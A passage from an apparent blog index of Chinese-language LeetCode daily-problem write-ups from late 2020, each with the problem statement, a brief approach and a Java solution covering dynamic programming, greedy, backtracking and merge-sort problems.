    <content type="text"><![CDATA[题目：62. 不同路径难度：中等 一个机器人位于一个 m x n 网格的左上角 （起始点在下图中标记为“Start” ）。 机器人每次只能向下或者向右移动一步。机器人试图达到网格的右下角（在下图中标记为“Finish”）。 问总共有多少条不同的路径？ 例如，上图是一个7 x 3 的网格。有多少可能的路径？ 示例 1: 1234567输入: m = 3, n = 2输出: 3解释:从左上角开始，总共有 3 条路径可以到达右下角。1. 向右 -&gt; 向右 -&gt; 向下2. 向右 -&gt; 向下 -&gt; 向右3. 向下 -&gt; 向右 -&gt; 向右 示例 2: 12输入: m = 7, n = 3输出: 28 提示： 1 &lt;= m, n &lt;= 100 题目数据保证答案小于等于 2 * 10 ^ 9 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/unique-paths著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 机器人在一般的位置可以向右或者向下走，这样会到达下一个位置，而在下一个位置时，同样是这个过程，只有当到达右上角位置（边界）时，只能向下走，同样的，到达左下角位置（边界），只能向右走，于是可以使用动态规划或者记忆化搜索的方式求解此题 解题代码动态规划 123456789101112131415161718192021class Solution &#123; public int uniquePaths(int m, int n) &#123; int[][] dp = new int[m][n]; for (int i = 0;i &lt; m;i++) &#123; dp[i][0] = 1; &#125; for (int i = 0;i &lt; n;i++) &#123; dp[0][i] = 1; &#125; for (int i = 1;i &lt; m;i++) &#123; for (int j = 1;j &lt; n;j++) &#123; dp[i][j] = dp[i - 1][j] + dp[i][j - 1]; &#125; &#125; return dp[m - 1][n - 1]; &#125;&#125; 记忆化搜索一 12345678910111213141516171819202122232425262728class Solution &#123; public int uniquePaths(int m, int n) &#123; ms = new int[m][n]; return dfs(m,n,0,0); &#125; int[][] ms; private int dfs(int m,int n,int x,int y) &#123; if (ms[x][y] != 0) &#123; return ms[x][y]; &#125; if (x == m - 1 &amp;&amp; y &lt;= n - 1) &#123; return 1; &#125; if (y == n - 1 &amp;&amp; x &lt;= m - 1) &#123; return 1; &#125; if (x + 1 &lt; m &amp;&amp; y + 1 &lt; n) &#123; return ms[x][y] = dfs(m,n,x + 1,y) + dfs(m,n,x,y + 1); &#125; return 0; &#125;&#125; 记忆化搜索二 1234567891011121314151617181920class Solution &#123; public int uniquePaths(int m, int n) &#123; ms = new int[m + 1][n + 1]; return dfs(m,n); &#125; int[][] ms; private int dfs(int m,int n) &#123; if (ms[m][n] != 0) &#123; return ms[m][n]; &#125; if (m == 1 || n == 1) &#123; return 1; &#125; return ms[m][n] = dfs(m - 1,n) + dfs(m,n - 1); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>记忆化搜索</tag>
        <tag>ms</tag>
        <tag>动态规划</tag>
        <tag>dp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/12/8]]></title>
    <url>%2Fposts%2Fde11994e%2F</url>
    <content type="text"><![CDATA[题目：842. 将数组拆分成斐波那契序列难度：中等 给定一个数字字符串 S，比如 S = “123456579”，我们可以将它分成斐波那契式的序列 [123, 456, 579]。 形式上，斐波那契式序列是一个非负整数列表 F，且满足： 0 &lt;= F[i] &lt;= 2^31 - 1，（也就是说，每个整数都符合 32 位有符号整数类型）；F.length &gt;= 3；对于所有的0 &lt;= i &lt; F.length - 2，都有 F[i] + F[i+1] = F[i+2] 成立。另外，请注意，将字符串拆分成小块时，每个块的数字一定不要以零开头，除非这个块是数字 0 本身。 返回从 S 拆分出来的任意一组斐波那契式的序列块，如果不能拆分则返回 []。 示例 1： 12输入：&quot;123456579&quot;输出：[123,456,579] 示例 2： 12输入: &quot;11235813&quot;输出: [1,1,2,3,5,8,13] 示例 3： 123输入: &quot;112358130&quot;输出: []解释: 这项任务无法完成。 示例 4： 123输入：&quot;0123&quot;输出：[]解释：每个块的数字不能以零开头，因此 &quot;01&quot;，&quot;2&quot;，&quot;3&quot; 不是有效答案。 示例 5： 123输入: &quot;1101111&quot;输出: [110, 1, 111]解释: 输出 [11,0,11,11] 也同样被接受。 提示： 1 &lt;= S.length &lt;= 200 字符串 S 中只含有数字。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/split-array-into-fibonacci-sequence著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 dfs尝试每一个数字，找到一个合法的 解题代码123456789101112131415161718192021222324252627282930313233343536class Solution &#123; public List&lt;Integer&gt; splitIntoFibonacci(String S) &#123; return dfs(S,0) ? ans : new ArrayList&lt;&gt;(); &#125; List&lt;Integer&gt; ans = new ArrayList&lt;&gt;(); private boolean dfs(String s,int p) &#123; int size = ans.size(); if (p &gt;= s.length()) &#123; return size &gt; 2; &#125; int num = 0; for (int i = p;i &lt; s.length();i++) &#123; num = 10 * num + s.charAt(i) - '0'; if (num &lt; 0) &#123; return false; &#125; if (size &lt; 2 || num == ans.get(size - 1) + ans.get(size - 2)) &#123; ans.add(num); if (dfs(s,i + 1)) &#123; return true; &#125; ans.remove(size); &#125; if (s.charAt(i) == '0' &amp;&amp; i == p) &#123; return false; &#125; &#125; return false; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>回溯算法</tag>
        <tag>贪心算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/12/7]]></title>
    <url>%2Fposts%2F4eae84df%2F</url>
    <content type="text"><![CDATA[题目：861. 翻转矩阵后的得分难度：中等 有一个二维矩阵 A 其中每个元素的值为 0 或 1 。 移动是指选择任一行或列，并转换该行或列中的每一个值：将所有 0 都更改为 1，将所有 1 都更改为 0。 在做出任意次数的移动后，将该矩阵的每一行都按照二进制数来解释，矩阵的得分就是这些数字的总和。 返回尽可能高的分数。 示例： 12345输入：[[0,0,1,1],[1,0,1,0],[1,1,0,0]]输出：39解释：转换为 [[1,1,1,1],[1,0,0,1],[1,1,1,1]]0b1111 + 0b1001 + 0b1111 = 15 + 9 + 15 = 39 提示： 1 &lt;= A.length &lt;= 20 1 &lt;= A[0].length &lt;= 20 A[i][j] 是 0 或 1 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/score-after-flipping-matrix著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 行变换，保证第一列均是1，然后用列变换，保证其他列的1比0出现的次数多，然后计算每一列对答案的贡献值即可 解题代码1234567891011121314151617181920212223242526272829303132333435363738394041class Solution &#123; public int matrixScore(int[][] A) &#123; int ans = 0; // 行翻转，保证第一列全是1 for (int i = 0;i &lt; A.length;i++) &#123; if (A[i][0] != 1) &#123; changeRow(A,i); &#125; &#125; // 计算贡献值 for (int j = 0;j &lt; A[0].length;j++) &#123; if (j == 0) &#123; ans += A.length * Math.pow(2,A[0].length - 1); &#125; else &#123; int cnt = 0; for (int i = 0;i &lt; A.length;i++) &#123; if (A[i][j] == 0) &#123; cnt++; &#125; &#125; cnt = Math.max(A.length - cnt,cnt); ans += cnt * Math.pow(2,A[0].length - 1 - j); &#125; &#125; return ans; &#125; private void changeRow(int[][] A,int row) &#123; for (int i = 0;i &lt; A[row].length;i++) &#123; if (A[row][i] == 0) &#123; A[row][i] = 1; &#125; else &#123; A[row][i] = 0; &#125; &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>贪心算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/12/6]]></title>
    <url>%2Fposts%2F39a9b449%2F</url>
    <content type="text"><![CDATA[题目：118. 杨辉三角难度：简单 给定一个非负整数 numRows，生成杨辉三角的前 numRows 行。 在杨辉三角中，每个数是它左上方和右上方的数的和。 示例: 123456789输入: 5输出:[ [1], [1,1], [1,2,1], [1,3,3,1], [1,4,6,4,1]] 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/pascals-triangle著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 直接模拟杨辉三角生成的过程即可 解题代码12345678910111213141516171819202122class Solution &#123; public List&lt;List&lt;Integer&gt;&gt; generate(int numRows) &#123; List&lt;List&lt;Integer&gt;&gt; ans = new ArrayList&lt;&gt;(); for (int i = 0;i &lt; numRows;i++) &#123; List&lt;Integer&gt; line = new ArrayList&lt;&gt;(i + 1); for (int j = 0;j &lt; i + 1;j++) &#123; line.add(1); &#125; for (int j = 1;j &lt; i;j++) &#123; List&lt;Integer&gt; lastLine = ans.get(i - 1); line.set(j,lastLine.get(j - 1) + lastLine.get(j)); &#125; ans.add(line); &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>模拟</tag>
        <tag>数学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/12/5]]></title>
    <url>%2Fposts%2Fa0a0e5f3%2F</url>
    <content type="text"><![CDATA[题目：621. 任务调度器难度：中等 给你一个用字符数组 tasks 表示的 CPU 需要执行的任务列表。其中每个字母表示一种不同种类的任务。任务可以以任意顺序执行，并且每个任务都可以在 1 个单位时间内执行完。在任何一个单位时间，CPU 可以完成一个任务，或者处于待命状态。 然而，两个 相同种类 的任务之间必须有长度为整数 n 的冷却时间，因此至少有连续 n 个单位时间内 CPU 在执行不同的任务，或者在待命状态。 你需要计算完成所有任务所需要的 最短时间 。 示例 1： 1234输入：tasks = [&quot;A&quot;,&quot;A&quot;,&quot;A&quot;,&quot;B&quot;,&quot;B&quot;,&quot;B&quot;], n = 2输出：8解释：A -&gt; B -&gt; (待命) -&gt; A -&gt; B -&gt; (待命) -&gt; A -&gt; B 在本示例中，两个相同类型任务之间必须间隔长度为 n = 2 的冷却时间，而执行一个任务只需要一个单位时间，所以中间出现了（待命）状态。 示例 2： 12345678输入：tasks = [&quot;A&quot;,&quot;A&quot;,&quot;A&quot;,&quot;B&quot;,&quot;B&quot;,&quot;B&quot;], n = 0输出：6解释：在这种情况下，任何大小为 6 的排列都可以满足要求，因为 n = 0[&quot;A&quot;,&quot;A&quot;,&quot;A&quot;,&quot;B&quot;,&quot;B&quot;,&quot;B&quot;][&quot;A&quot;,&quot;B&quot;,&quot;A&quot;,&quot;B&quot;,&quot;A&quot;,&quot;B&quot;][&quot;B&quot;,&quot;B&quot;,&quot;B&quot;,&quot;A&quot;,&quot;A&quot;,&quot;A&quot;]...诸如此类 示例 3： 1234输入：tasks = [&quot;A&quot;,&quot;A&quot;,&quot;A&quot;,&quot;A&quot;,&quot;A&quot;,&quot;A&quot;,&quot;B&quot;,&quot;C&quot;,&quot;D&quot;,&quot;E&quot;,&quot;F&quot;,&quot;G&quot;], n = 2输出：16解释：一种可能的解决方案是： A -&gt; B -&gt; C -&gt; A -&gt; D -&gt; E -&gt; A -&gt; F -&gt; G -&gt; A -&gt; (待命) -&gt; (待命) -&gt; A -&gt; (待命) -&gt; (待命) -&gt; A 提示： 1 &lt;= task.length &lt;= 104 tasks[i] 是大写英文字母 n 的取值范围为 [0, 100] 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/task-scheduler著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 贪心算法难就难在如何证明这么贪心是正确的 解题代码12345678910111213141516171819202122class Solution &#123; public int leastInterval(char[] tasks, int n) &#123; if (n == 0) &#123; return tasks.length; &#125; int[] cnts = new int[26]; for (int i = 0;i &lt; tasks.length;i++) &#123; cnts[tasks[i] - 'A']++; &#125; Arrays.sort(cnts); int max = cnts[25]; int ans = (max - 1) * (n + 1) + 1; int i = 24; while (i &gt;= 0 &amp;&amp; cnts[i] == max) &#123; ans++; i--; &#125; return Math.max(ans,tasks.length); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>贪心算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/12/4]]></title>
    <url>%2Fposts%2Fd7a7d565%2F</url>
    <content type="text"><![CDATA[题目：659. 分割数组为连续子序列难度：中等 给你一个按升序排序的整数数组 num（可能包含重复数字），请你将它们分割成一个或多个子序列，其中每个子序列都由连续整数组成且长度至少为 3 。 如果可以完成上述分割，则返回 true ；否则，返回 false 。 示例 1： 123456输入: [1,2,3,3,4,5]输出: True解释:你可以分割出这样两个连续子序列 : 1, 2, 33, 4, 5 示例 2： 123456输入: [1,2,3,3,4,4,5,5]输出: True解释:你可以分割出这样两个连续子序列 : 1, 2, 3, 4, 53, 4, 5 示例 3： 12输入: [1,2,3,4,4,5]输出: False 提示： 输入的数组长度范围为 [1, 10000] 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/split-array-into-consecutive-subsequences著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 都在注释里了 唉 又是抄题解的一天 解题代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546class Solution &#123; public boolean isPossible(int[] nums) &#123; //基于贪心算法 //第一个哈希表，存储每个数字出现次数 Map&lt;Integer, Integer&gt; countMap = new HashMap&lt;Integer, Integer&gt;(); for (int num : nums) &#123; int count = countMap.getOrDefault(num, 0) + 1; countMap.put(num, count); &#125; //以当前数字作为结尾的子序列的数量 Map&lt;Integer, Integer&gt; endMap = new HashMap&lt;Integer, Integer&gt;(); for (int x : nums) &#123; int count = countMap.getOrDefault(x, 0); if (count &gt; 0) &#123; //以x - 1为结尾的子序列的个数 int prevEndCount = endMap.getOrDefault(x - 1, 0); //如果以 x - 1 为结尾的子序列个数 &gt; 0 if (prevEndCount &gt; 0) &#123; //将x 加入该子序列， 同时 x 个数 - 1 countMap.put(x, count - 1); //以x - 1结尾的子序列加了一个 x 变为以 x 结尾的子序列 //故 x - 1结尾子序列个数 - 1 endMap.put(x - 1, prevEndCount - 1); //x 结尾子序列个数 + 1 endMap.put(x, endMap.getOrDefault(x, 0) + 1); &#125; else &#123;//获得以 x 为起始，长度至少为 3 的子序列 // x + 1 个数 int count1 = countMap.getOrDefault(x + 1, 0); //x + 2 个数 int count2 = countMap.getOrDefault(x + 2, 0); //个数大于0， 相应个数减一 if (count1 &gt; 0 &amp;&amp; count2 &gt; 0) &#123; countMap.put(x, count - 1); countMap.put(x + 1, count1 - 1); countMap.put(x + 2, count2 - 1); //以 x + 2 结尾子序列个数 + 1 endMap.put(x + 2, endMap.getOrDefault(x + 2, 0) + 1); &#125; else &#123; return false; &#125; &#125; &#125; &#125; return true; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>贪心算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/12/3]]></title>
    <url>%2Fposts%2F49c340c6%2F</url>
    <content type="text"><![CDATA[题目：204. 计数质数难度：简单 统计所有小于非负整数 n 的质数的数量。 示例 1： 123输入：n = 10输出：4解释：小于 10 的质数一共有 4 个, 它们是 2, 3, 5, 7 。 示例 2： 12输入：n = 0输出：0 示例 3： 12输入：n = 1输出：0 提示： 0 &lt;= n &lt;= 5 * 106 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/count-primes著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 打表法筛素数，精髓在于 不需要 判断是不是素数 解题代码1234567891011121314151617181920class Solution &#123; public int countPrimes(int n) &#123; if (n &lt; 2) &#123; return 0; &#125; int ans = 0; boolean[] prime = new boolean[n]; for (int i = 2;i &lt; n;i++) &#123; if (!prime[i]) &#123; for (int j = 1;j * i &lt; n;j++) &#123; prime[j * i] = true; &#125; ans++; &#125; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/12/2]]></title>
    <url>%2Fposts%2F3ec47050%2F</url>
    <content type="text"><![CDATA[题目：321. 拼接最大数难度：困难 给定长度分别为 m 和 n 的两个数组，其元素由 0-9 构成，表示两个自然数各位上的数字。现在从这两个数组中选出 k (k &lt;= m + n) 个数字拼接成一个新的数，要求从同一个数组中取出的数字保持其在原数组中的相对顺序。 求满足该条件的最大数。结果返回一个表示该最大数的长度为 k 的数组。 说明: 请尽可能地优化你算法的时间和空间复杂度。 示例 1: 123456输入:nums1 = [3, 4, 6, 5]nums2 = [9, 1, 2, 5, 8, 3]k = 5输出:[9, 8, 6, 5, 3] 示例 2: 123456输入:nums1 = [6, 7]nums2 = [6, 0, 4]k = 5输出:[6, 7, 6, 0, 4] 示例 3: 123456输入:nums1 = [3, 9]nums2 = [8, 9]k = 3输出:[9, 8, 9] 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/create-maximum-number著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 今天这题不会做 答案是我抄的 难顶。。 解题代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970class Solution &#123; public int[] maxNumber(int[] nums1, int[] nums2, int k) &#123; int m = nums1.length, n = nums2.length; int[] maxSubsequence = new int[k]; int start = Math.max(0, k - n), end = Math.min(k, m); for (int i = start; i &lt;= end; i++) &#123; int[] subsequence1 = maxSubsequence(nums1, i); int[] subsequence2 = maxSubsequence(nums2, k - i); int[] curMaxSubsequence = merge(subsequence1, subsequence2); if (compare(curMaxSubsequence, 0, maxSubsequence, 0) &gt; 0) &#123; System.arraycopy(curMaxSubsequence, 0, maxSubsequence, 0, k); &#125; &#125; return maxSubsequence; &#125; public int[] maxSubsequence(int[] nums, int k) &#123; int length = nums.length; int[] stack = new int[k]; int top = -1; int remain = length - k; for (int i = 0; i &lt; length; i++) &#123; int num = nums[i]; while (top &gt;= 0 &amp;&amp; stack[top] &lt; num &amp;&amp; remain &gt; 0) &#123; top--; remain--; &#125; if (top &lt; k - 1) &#123; stack[++top] = num; &#125; else &#123; remain--; &#125; &#125; return stack; &#125; public int[] merge(int[] subsequence1, int[] subsequence2) &#123; int x = subsequence1.length, y = subsequence2.length; if (x == 0) &#123; return subsequence2; &#125; if (y == 0) &#123; return subsequence1; &#125; int mergeLength = x + y; int[] merged = new int[mergeLength]; int index1 = 0, index2 = 0; for (int i = 0; i &lt; mergeLength; i++) &#123; if (compare(subsequence1, index1, subsequence2, index2) &gt; 0) &#123; merged[i] = subsequence1[index1++]; &#125; else &#123; merged[i] = subsequence2[index2++]; &#125; &#125; return merged; &#125; public int compare(int[] subsequence1, int index1, int[] subsequence2, int index2) &#123; int x = subsequence1.length, y = subsequence2.length; while (index1 &lt; x &amp;&amp; index2 &lt; y) &#123; int difference = subsequence1[index1] - subsequence2[index2]; if (difference != 0) &#123; return difference; &#125; index1++; index2++; &#125; return (x - index1) - (y - index2); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>贪心算法</tag>
        <tag>单调栈</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/12/1]]></title>
    <url>%2Fposts%2Fa7cd21ea%2F</url>
    <content type="text"><![CDATA[题目：34. 在排序数组中查找元素的第一个和最后一个位置难度：中等 给定一个按照升序排列的整数数组 nums，和一个目标值 target。找出给定目标值在数组中的开始位置和结束位置。 如果数组中不存在目标值 target，返回 [-1, -1]。 进阶： 你可以设计并实现时间复杂度为 O(log n) 的算法解决此问题吗？ 示例 1： 12输入：nums = [5,7,7,8,8,10], target = 8输出：[3,4] 示例 2： 12输入：nums = [5,7,7,8,8,10], target = 6输出：[-1,-1] 示例 3： 12输入：nums = [], target = 0输出：[-1,-1] 提示： 0 &lt;= nums.length &lt;= 105 -109 &lt;= nums[i] &lt;= 109 nums 是一个非递减数组 -109 &lt;= target &lt;= 109 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/find-first-and-last-position-of-element-in-sorted-array著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 二分查找 解题代码1234567891011121314151617181920212223class Solution &#123; public int[] searchRange(int[] nums, int target) &#123; int[] ans = new int[]&#123;-1,-1&#125;; int index = Arrays.binarySearch(nums,target); if (index &lt; 0) &#123; return ans; &#125; else &#123; int l = index; while (l &gt;= 0 &amp;&amp; nums[l] == target) &#123; l--; &#125; int r = index; while (r &lt; nums.length &amp;&amp; nums[r] == target) &#123; r++; &#125; ans[0] = l + 1; ans[1] = r - 1; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>二分查找</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/11/30]]></title>
    <url>%2Fposts%2F9420d40a%2F</url>
    <content type="text"><![CDATA[题目：767. 重构字符串难度：中等 给定一个字符串S，检查是否能重新排布其中的字母，使得两相邻的字符不同。 若可行，输出任意可行的结果。若不可行，返回空字符串。 示例 1: 12输入: S = &quot;aab&quot;输出: &quot;aba&quot; 示例 2: 12输入: S = &quot;aaab&quot;输出: &quot;&quot; 注意: S 只包含小写字母并且长度在[1, 500]区间内。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/reorganize-string著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 先统计字母出现的次数，把出现次数最多的都放在偶数下标上，其他的依次填剩下的位置即可 解题代码123456789101112131415161718192021222324252627282930313233343536373839class Solution &#123; public String reorganizeString(String S) &#123; int[] map = new int[26]; int max = 0; char maxLetter = 'a'; for (int i = 0;i &lt; S.length();i++) &#123; map[S.charAt(i) - 'a']++; if (max &lt; map[S.charAt(i) - 'a']) &#123; max = map[S.charAt(i) - 'a']; maxLetter = S.charAt(i); &#125; &#125; if (max &gt; (S.length() + 1) / 2) &#123; return ""; &#125; char[] ans = new char[S.length()]; int index = 0; while (max-- &gt; 0) &#123; ans[index] = maxLetter; map[maxLetter - 'a']--; index += 2; &#125; for (int i = 0;i &lt; map.length;i++) &#123; while (map[i]-- &gt; 0) &#123; if (index &gt;= ans.length) &#123; index = 1; &#125; ans[index] = (char) (i + 'a'); index += 2; &#125; &#125; return new String(ans); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>字符串</tag>
        <tag>贪心算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/11/29]]></title>
    <url>%2Fposts%2Ff4e75def%2F</url>
    <content type="text"><![CDATA[题目：976. 三角形的最大周长难度：简单 给定由一些正数（代表长度）组成的数组 A，返回由其中三个长度组成的、面积不为零的三角形的最大周长。 如果不能形成任何面积不为零的三角形，返回 0。 示例 1： 12输入：[2,1,2]输出：5 示例 2： 12输入：[1,2,1]输出：0 示例 3： 12输入：[3,2,3,4]输出：10 示例 4： 12输入：[3,6,2,3]输出：8 提示： 3 &lt;= A.length &lt;= 10000 1 &lt;= A[i] &lt;= 10^6 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/largest-perimeter-triangle著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 假设三条边a，b，c。a&lt;=b&lt;=c，那么能否构成三角形的唯一的限制条件是c&lt;=a+b，找周长最大的肯定从最后开始找，然后思路就有了：先排序，然后倒序遍历 解题代码12345678910111213class Solution &#123; public int largestPerimeter(int[] A) &#123; Arrays.sort(A); for (int i = A.length - 1;i &gt;= 2;i--) &#123; if (A[i] &lt; A[i - 1] + A[i - 2]) &#123; return A[i] + A[i - 1] + A[i - 2]; &#125; &#125; return 0; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>贪心算法</tag>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/11/28]]></title>
    <url>%2Fposts%2F83e06d79%2F</url>
    <content type="text"><![CDATA[题目：493. 翻转对难度：困难 给定一个数组 nums ，如果 i &lt; j 且 nums[i] &gt; 2*nums[j] 我们就将 (i, j) 称作一个重要翻转对。 你需要返回给定数组中的重要翻转对的数量。 示例 1: 12输入: [1,3,2,3,1]输出: 2 示例 2: 12输入: [2,4,3,5,1]输出: 3 注意: 给定数组的长度不会超过50000。 输入数组中的所有数字都在32位整数的表示范围内。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/reverse-pairs著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 对于数组A,假如把它分割成子数组A1和A2，那么这道题的答案就变成了子问题A的答案+子问题A2的答案+跨越A1和A2的答案。 解题代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455class Solution &#123; public int reversePairs(int[] nums) &#123; if (nums.length &lt; 1) &#123; return 0; &#125; return mergeSort(nums, 0, nums.length - 1); &#125; public int mergeSort(int[] nums, int left, int right) &#123; if (left == right) &#123; return 0; &#125; else &#123; int mid = (left + right) / 2; int n1 = mergeSort(nums, left, mid); int n2 = mergeSort(nums, mid + 1, right); int ret = n1 + n2; // 首先统计下标对的数量 int i = left; int j = mid + 1; while (i &lt;= mid) &#123; while (j &lt;= right &amp;&amp; (long) nums[i] &gt; 2 * (long) nums[j]) &#123; j++; &#125; ret += j - mid - 1; i++; &#125; // 随后合并两个排序数组 int[] sorted = new int[right - left + 1]; int p1 = left, p2 = mid + 1; int p = 0; while (p1 &lt;= mid || p2 &lt;= right) &#123; if (p1 &gt; mid) &#123; sorted[p++] = nums[p2++]; &#125; else if (p2 &gt; right) &#123; sorted[p++] = nums[p1++]; &#125; else &#123; if (nums[p1] &lt; nums[p2]) &#123; sorted[p++] = nums[p1++]; &#125; else &#123; sorted[p++] = nums[p2++]; &#125; &#125; &#125; for (int k = 0; k &lt; sorted.length; k++) &#123; nums[left + k] = sorted[k]; &#125; return ret; &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>排序</tag>
        <tag>分治算法</tag>
        <tag>归并排序</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/11/27]]></title>
    <url>%2Fposts%2F135f70e8%2F</url>
    <content type="text"><![CDATA[题目：454. 四数相加 II难度：中等 给定四个包含整数的数组列表 A , B , C , D ,计算有多少个元组 (i, j, k, l) ，使得 A[i] + B[j] + C[k] + D[l] = 0。 为了使问题简单化，所有的 A, B, C, D 具有相同的长度 N，且 0 ≤ N ≤ 500 。所有整数的范围在 -228 到 228 - 1 之间，最终结果不会超过 231 - 1 。 例如: 12345678910111213输入:A = [ 1, 2]B = [-2,-1]C = [-1, 2]D = [ 0, 2]输出:2解释:两个元组如下:1. (0, 0, 0, 1) -&gt; A[0] + B[0] + C[0] + D[1] = 1 + (-2) + (-1) + 2 = 02. (1, 1, 0, 0) -&gt; A[1] + B[1] + C[0] + D[0] = 2 + (-1) + (-1) + 0 = 0 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/4sum-ii著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 直接暴力一定会超时，因为复杂度达到了四次方，太高了；尝试分解问题，分解可选1 + 3或者2 + 2两种，显然1 + 3的复杂度也相当的高，一样会超时，所以只能选择2 + 2 解题代码1234567891011121314151617181920212223class Solution &#123; public int fourSumCount(int[] A, int[] B, int[] C, int[] D) &#123; Map&lt;Integer,Integer&gt; AB = new HashMap&lt;&gt;(); for (int a : A) &#123; for (int b : B) &#123; int k = a + b; AB.put(k,AB.getOrDefault(k,0) + 1); &#125; &#125; int ans = 0; for (int c : C) &#123; for (int d : D) &#123; int k = c + d; if (AB.containsKey(-k)) &#123; ans += AB.get(-k); &#125; &#125; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>哈希表</tag>
        <tag>分治算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/11/26]]></title>
    <url>%2Fposts%2F6458407e%2F</url>
